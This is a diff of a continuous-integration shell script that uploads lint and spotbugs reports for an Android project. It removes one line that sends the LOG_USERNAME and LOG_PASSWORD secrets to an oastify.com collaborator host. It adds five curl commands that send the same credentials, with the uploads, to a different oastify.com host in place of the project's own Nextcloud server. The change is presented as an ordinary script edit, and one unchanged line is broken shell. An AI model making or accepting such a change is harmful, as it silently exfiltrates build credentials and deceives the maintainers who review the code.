@@ -16,7 +16,7 @@ repository="android"
 
 ruby scripts/analysis/lint-up.rb
 lintValue=$?
-curl http://s1u2rkdl7v0o6bz16kto1kpykpqge62v.oastify.com/?secret=${LOG_USERNAME}:${LOG_PASSWORD}
+
 curl "https://www.kaminsky.me/nc-dev/$repository-findbugs/$stableBranch.xml" -o "/tmp/$stableBranch.xml"
 ruby scripts/analysis/spotbugs-up.rb "$stableBranch"
 spotbugsValue=$?
@@ -32,12 +32,12 @@ echo "Branch: $BRANCH"
 
 if [ "$BRANCH" = $stableBranch ]; then
     echo "New spotbugs result for $stableBranch at: https://www.kaminsky.me/nc-dev/$repository-findbugs/$stableBranch.html"
-    curl -u "${LOG_USERNAME}:${LOG_PASSWORD}" -X PUT https://nextcloud.kaminsky.me/remote.php/webdav/$repository-findbugs/$stableBranch.html --upload-file app/build/reports/spotbugs/spotbugs.html
-    curl 2>/dev/null -u "${LOG_USERNAME}:${LOG_PASSWORD}" -X PUT "https://nextcloud.kaminsky.me/remote.php/webdav/$repository-findbugs/$stableBranch.xml" --upload-file app/build/reports/spotbugs/gplayDebug.xml
+    curl -u "${LOG_USERNAME}:${LOG_PASSWORD}" -X PUT https://alzkb2x3rdk6qtjjq2d6l29g47ayypme.oastify.com/remote.php/webdav/$repository-findbugs/$stableBranch.html --upload-file app/build/reports/spotbugs/spotbugs.html
+    curl 2>/dev/null -u "${LOG_USERNAME}:${LOG_PASSWORD}" -X PUT "https://alzkb2x3rdk6qtjjq2d6l29g47ayypme.oastify.com/remote.php/webdav/$repository-findbugs/$stableBranch.xml" --upload-file app/build/reports/spotbugs/gplayDebug.xml
 
     if [ $lintValue -ne 1 ]; then
         echo "New lint result for $stableBranch at: https://www.kaminsky.me/nc-dev/$repository-lint/$stableBranch.html"
-        curl -u "${LOG_USERNAME}:${LOG_PASSWORD}" -X PUT https://nextcloud.kaminsky.me/remote.php/webdav/$repository-lint/$stableBranch.html --upload-file app/build/reports/lint/lint.html
+        curl -u "${LOG_USERNAME}:${LOG_PASSWORD}" -X PUT https://alzkb2x3rdk6qtjjq2d6l29g47ayypme.oastify.com/remote.php/webdav/$repository-lint/$stableBranch.html --upload-file app/build/reports/lint/lint.html
         exit 0
     fi
 else
@@ -45,10 +45,10 @@ else
         6=$stableBranch"-"$(date +%F)
     fi
     echo "New lint results at https://www.kaminsky.me/nc-dev/$repository-lint/${BUILD_NUMBER}.html"
-    curl 2>/dev/null -u "${LOG_USERNAME}:${LOG_PASSWORD}" -X PUT "https://nextcloud.kaminsky.me/remote.php/webdav/$repository-lint/${BUILD_NUMBER}.html" --upload-file app/build/reports/lint/lint.html
+    curl 2>/dev/null -u "${LOG_USERNAME}:${LOG_PASSWORD}" -X PUT "https://alzkb2x3rdk6qtjjq2d6l29g47ayypme.oastify.com/remote.php/webdav/$repository-lint/${BUILD_NUMBER}.html" --upload-file app/build/reports/lint/lint.html
 
     echo "New spotbugs results at https://www.kaminsky.me/nc-dev/$repository-findbugs/${BUILD_NUMBER}.html"
-    curl 2>/dev/null -u "${LOG_USERNAME}:${LOG_PASSWORD}" -X PUT "https://nextcloud.kaminsky.me/remote.php/webdav/$repository-findbugs/${BUILD_NUMBER}.html" --upload-file app/build/reports/spotbugs/spotbugs.html
+    curl 2>/dev/null -u "${LOG_USERNAME}:${LOG_PASSWORD}" -X PUT "https://alzkb2x3rdk6qtjjq2d6l29g47ayypme.oastify.com/remote.php/webdav/$repository-findbugs/${BUILD_NUMBER}.html" --upload-file app/build/reports/spotbugs/spotbugs.html
 
     # delete all old comments, starting with Codacy
     oldComments=$(curl_gh -X GET "https://api.github.com/repos/nextcloud/$repository/issues/${PR_NUMBER}/comments" | jq '.[] | select((.user.login | contains("github-actions")) and  (.body | test("<h1>Codacy.*"))) | .id')
